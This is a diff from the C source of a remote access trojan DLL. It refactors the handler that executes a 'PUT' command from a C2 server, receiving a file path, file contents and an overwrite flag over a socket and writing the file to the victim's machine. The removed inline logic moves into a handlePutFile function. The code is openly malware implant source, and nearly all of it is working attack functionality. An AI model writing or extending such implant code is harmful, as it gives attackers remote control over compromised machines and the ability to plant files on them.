@@ -115,84 +115,15 @@ INT startListen()
             // C2 told us to put a file so lets get the file path first 
             if (strcmp((const char*)&recvBuf, PUT) == 0)
             {
-                // Get the file path
-                status = recv(clientSock, recvBuf, recvBufLen, 0);
-                if (status == SOCKET_ERROR)
-                {               
-                    // TODO: have a function call to send back failure? Request a resend?
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (file path) %d\n", WSAGetLastError());
-                    OutputDebugStringA(msgBuf);
-                    continue; // keep trying to do things until we disconnect or receive a cleanup message
-                }
-
-                // Assign file path to separate buffer 
-                CHAR filePathBuffer[DEFAULT_BUF_LEN];
-                strcpy(filePathBuffer, recvBuf);
-
-                // We got the file path 
-                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file on path %s...\n", filePathBuffer);
-                OutputDebugStringA(msgBuf);
-
-                // Get the actual file bytes
-                status = recv(clientSock, recvBuf, recvBufLen, 0);
-                if (status == SOCKET_ERROR)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (file bytes) %d\n", WSAGetLastError());
-                    OutputDebugStringA(msgBuf);
-                    continue;
-                }
-
-                CONST UINT64 fileBytesSize = strlen(recvBuf);
-                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file with %i bytes...\n", fileBytesSize);
-                OutputDebugStringA(msgBuf);
-
-                // Just a char buffer containing our bytes 
-                char* fileBytes = (char*)malloc(sizeof(char) * fileBytesSize);
-                if (fileBytes == NULL)
-                {
-                    OutputDebugStringA("RAT-Dll::startListen - Failed to allocate space for fileBytes buffer! \n");
-                    status = FAILURE;
-                    goto cleanup;
-                }
-
-                strcpy(fileBytes, recvBuf);
-                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file with bytes %s...\n", fileBytes);
-                OutputDebugStringA(msgBuf);
-
-                // Get our overwrite value 
-                status = recv(clientSock, recvBuf, recvBufLen, 0);
-                if (status == SOCKET_ERROR)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (overwrite) %d\n", WSAGetLastError());
-                    OutputDebugStringA(msgBuf);
-                    continue;
-                }
-
-                BOOL overwrite = *recvBuf;
-                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Put file overwrite value %i ...\n", overwrite);
-                OutputDebugStringA(msgBuf);
-
-                status = performPutFile(filePathBuffer, fileBytes, overwrite);
+                status = handlePutFile(clientSock);
                 if (status != SUCCESS)
                 {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performPutFile %d\n", status);
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from performPutFile %d\n", status);
                     OutputDebugStringA(msgBuf);
                     goto cleanup;
                 }
 
-                // Send back our success code 
-                status = send(clientSock, "SUCCESS", 7, 0);
-                if (status == SOCKET_ERROR)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (status code) %d\n", WSAGetLastError());
-                    OutputDebugStringA(msgBuf);
-                    status = WSAGetLastError();
-                    goto cleanup;
-                }
-
-                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully put file!\n");
-
-                free(fileBytes);
+                OutputDebugStringA("RAT-Dll::startListen - Successfully performed put file! \n");
             }
 
             // C2 told us to get a file so lets get the file path first 
